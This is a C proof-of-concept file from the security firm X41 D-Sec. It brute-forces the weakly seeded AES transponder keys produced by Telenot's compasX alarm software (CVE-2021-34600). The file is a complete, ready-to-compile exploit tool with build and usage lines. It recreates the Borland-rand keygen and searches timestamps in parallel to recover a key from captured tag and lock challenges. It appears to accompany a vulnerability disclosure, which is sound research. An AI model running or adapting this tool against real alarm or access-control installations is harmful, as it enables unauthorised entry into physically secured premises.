// X41 D-Sec GmbH, 2022-01-23, Markus Vervier, Ya≈üar Klawohn
// Sebastien Riou, 2019-05-14
//
// FAST brute force transponder aes keys generated by Telenot's compasX software
// CVE-2021-34600, more information available at https://www.x41-dsec.de/lab/blog/telenot-complex-insecure-keygen/
// requires AES-NI
// 
// gcc -o brute-cve-2021-34600-fork -march=native -maes -Ofast brute-cve-2021-34600-fork.c
//
// usage example: ./brute-cve-2021-34600-fork -timestamp 1505394800 -workers 8 -tag_challenge bb6aea729414a5b1eff7b16328ce37fd -lock_challenge 82f5f498dbc29f7570102397a2e5ef2b6dc14a864f665b3c54d11765af81e95c
//

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <stdbool.h>
#include <unistd.h>
#include <limits.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <string.h>
#include <getopt.h>

/* The following is from https://github.com/sebastien-riou/aes-brute-force/blob/master/include/aes_ni.h */
#include <wmmintrin.h>  //for intrinsics for AES-NI

//internal stuff

//macros

#define DO_DEC_BLOCK(m,k) \
	do{\
		m = _mm_xor_si128       (m, k[10+0]); \
		m = _mm_aesdec_si128    (m, k[10+1]); \
		m = _mm_aesdec_si128    (m, k[10+2]); \
		m = _mm_aesdec_si128    (m, k[10+3]); \
		m = _mm_aesdec_si128    (m, k[10+4]); \
		m = _mm_aesdec_si128    (m, k[10+5]); \
		m = _mm_aesdec_si128    (m, k[10+6]); \
		m = _mm_aesdec_si128    (m, k[10+7]); \
		m = _mm_aesdec_si128    (m, k[10+8]); \
		m = _mm_aesdec_si128    (m, k[10+9]); \
		m = _mm_aesdeclast_si128(m, k[0]);\
	}while(0)

#define AES_128_key_exp(k, rcon) aes_128_key_expansion(k, _mm_aeskeygenassist_si128(k, rcon))


static __m128i aes_128_key_expansion(__m128i key, __m128i keygened){
	keygened = _mm_shuffle_epi32(keygened, _MM_SHUFFLE(3,3,3,3));
	key = _mm_xor_si128(key, _mm_slli_si128(key, 4));
	key = _mm_xor_si128(key, _mm_slli_si128(key, 4));
	key = _mm_xor_si128(key, _mm_slli_si128(key, 4));
	return _mm_xor_si128(key, keygened);
}


void aes128_dec(uint8_t *cipherText,uint8_t *enc_key, uint8_t *plainText){

	// key exapnsion
	__m128i key_schedule[20];//the expanded key
	key_schedule[0] = _mm_loadu_si128((const __m128i*) enc_key);
	key_schedule[1]  = AES_128_key_exp(key_schedule[0], 0x01);
	key_schedule[2]  = AES_128_key_exp(key_schedule[1], 0x02);
	key_schedule[3]  = AES_128_key_exp(key_schedule[2], 0x04);
	key_schedule[4]  = AES_128_key_exp(key_schedule[3], 0x08);
	key_schedule[5]  = AES_128_key_exp(key_schedule[4], 0x10);
	key_schedule[6]  = AES_128_key_exp(key_schedule[5], 0x20);
	key_schedule[7]  = AES_128_key_exp(key_schedule[6], 0x40);
	key_schedule[8]  = AES_128_key_exp(key_schedule[7], 0x80);
	key_schedule[9]  = AES_128_key_exp(key_schedule[8], 0x1B);
	key_schedule[10] = AES_128_key_exp(key_schedule[9], 0x36);

	// generate decryption keys in reverse order.
	// k[10] is shared by last encryption and first decryption rounds
	// k[0] is shared by first encryption round and last decryption round (and is the original user key)
	// For some implementation reasons, decryption key schedule is NOT the encryption key schedule in reverse order
	key_schedule[11] = _mm_aesimc_si128(key_schedule[9]);
	key_schedule[12] = _mm_aesimc_si128(key_schedule[8]);
	key_schedule[13] = _mm_aesimc_si128(key_schedule[7]);
	key_schedule[14] = _mm_aesimc_si128(key_schedule[6]);
	key_schedule[15] = _mm_aesimc_si128(key_schedule[5]);
	key_schedule[16] = _mm_aesimc_si128(key_schedule[4]);
	key_schedule[17] = _mm_aesimc_si128(key_schedule[3]);
	key_schedule[18] = _mm_aesimc_si128(key_schedule[2]);
	key_schedule[19] = _mm_aesimc_si128(key_schedule[1]);

	// actual decryption
	__m128i m = _mm_loadu_si128((__m128i *) cipherText);
	DO_DEC_BLOCK(m,key_schedule);
	_mm_storeu_si128((__m128i *) plainText, m);
}


#define likely(x)      __builtin_expect(!!(x), 1)
#define unlikely(x)      __builtin_expect(!!(x), 0)


uint32_t seed = 0;

uint32_t borland_rand() {
	seed = (seed * 22695477) % UINT_MAX;
	seed = (seed + 1) % UINT_MAX;
	return (seed >> 16) & 0x7fff;
}

void borland_srand(uint32_t s) {
	seed = s;
	borland_rand();
}

void make_key(uint32_t seed, uint8_t * key) {
	borland_srand(seed);
	for (int i = 0; i < 16; i++) {
		key[i] = borland_rand() % 0xFF;
	}
}


void decrypt32_iv(uint8_t * cipher, uint8_t * key, uint8_t * iv, uint8_t * plain) {
	aes128_dec(cipher,key,plain);
	for (uint8_t i = 0; i <= 16;i++) {
		plain[i] ^= iv[i];
	}
	aes128_dec(&cipher[16],key,&plain[16]);
	for (uint8_t i = 0; i <= 16;i++) {
		plain[16+i] ^= cipher[i];
	}
}
void decrypt(uint8_t * cipher, uint8_t * key, uint8_t * plain) {
	aes128_dec(cipher,key,plain);
}


int hexstr_to_byte_array(char hexstr[], uint8_t bytes[], size_t byte_len) {
	size_t hexstr_len = strlen(hexstr);
	if (hexstr_len % 16) {
		return 1;
	}
	if (byte_len < hexstr_len/2) {
		return 2;
	}
	char *pos = &hexstr[0];
	for (size_t count = 0; *pos != 0; count++) {
		sscanf(pos, "%2hhx", &bytes[count]);
		pos += 2;
	}
	return 0;
}

int main (int argc, char* argv[]) {
	uint32_t start_time = time(NULL);
	uint8_t  tag_challenge[16] = {0x00};
	uint8_t  lock_challenge[32] = {0x00};
	uint32_t timestamp_arg  = 0;
	uint8_t worker = 1;
	uint16_t workers[64] = {0x00};
	uint32_t partition = 0;
	uint32_t slice = 0;
	uint32_t iterations = 0;
	uint8_t dec_tag[16] = {0x00};
	uint8_t dec_lock[32] = {0x00};
	uint8_t key[16] = {0x00};
	int c = 0;
	uint8_t has_tagchallenge = 0;
	uint8_t has_lockchallenge = 0;

	static struct option long_options[] = {
		/*   NAME       ARGUMENT           FLAG  SHORTNAME */
		{"workers",   required_argument, NULL, 'w'},
		{"timestamp", required_argument,       NULL, 's'},
		{"tag_challenge",  required_argument, NULL, 't'},
		{"lock_challenge",  required_argument, NULL, 'l'},
		{NULL,      0,                 NULL, 0}
	};
	int option_index = 0;
	bool usage = false;
	while ((c = getopt_long_only(argc, argv, ":w:s:t:l:h",
					long_options, &option_index)) != -1) {

		switch (c) {
			case 'w':
				worker = atoi(optarg);
				if (worker > 64) {
					printf("maximum 64 workers supported\n");
					return 1;
				}
				break;
			case 's':
				timestamp_arg = atoi(optarg);
				break;
			case 't':
				if(hexstr_to_byte_array(optarg, tag_challenge, sizeof(tag_challenge))) {
					return 2;
				}
				has_tagchallenge = 1;
				break;
			case 'l':
				if(hexstr_to_byte_array(optarg, lock_challenge, sizeof(lock_challenge))) {
					return 3;
				}
				has_lockchallenge = 1;
				break;
			case 'h':
			case '?':
				break;
			default:
				usage = true;
		}
	}
	if (usage || !has_tagchallenge || !has_lockchallenge) {
		printf("required parameters -tag_challenge and -lock_challenge missing");
		printf("usage: %s -workers <noworkers> -timestamp <unix timestamp> -tag_challenge <16 byte tag challenge> -lock_challenge <32 byte lock challenge>", argv[0]);
		return 1;
	}


	iterations = start_time - timestamp_arg;
	partition = iterations/worker;

	printf("starting up %d workers with %d iterations each...STAY TUNED\n", worker, iterations/worker);

	for (int j = 0; j < worker; j++) {
		slice = j*partition;
		uint32_t stop_time = timestamp_arg+slice+partition;
		workers[j] = fork();
		if (workers[j] == 0) { // child
			for (uint32_t timestamp = timestamp_arg+slice; timestamp < stop_time; timestamp++) {
				// each thread needs their own local variables)
				make_key(timestamp, &key[0]);
				decrypt(&tag_challenge[0], &key[0], &dec_tag[0]); // blocksize assumed to always be 16.
				decrypt32_iv(&lock_challenge[0], &key[0], &tag_challenge[0], &dec_lock[0]);

				if ( unlikely(
							!(
								(dec_tag[0] != dec_lock[16+15]) || 
								memcmp(&dec_tag[1], &dec_lock[16], 15))
					     )
				   ) {
					printf("\btimestamp: %i\nkey: ", timestamp);
					for (int i = 0; i < 16; i++) {
						printf("%02x", key[i]);
					}
					printf("\n");
					kill(getppid(), 15); // dirty dirty :P
				}


			}
			return 2;
		}

	}
	
	// wait until all finished or we get killed by worker that found the key
	while(wait(NULL) > 0);
	return 0;
}
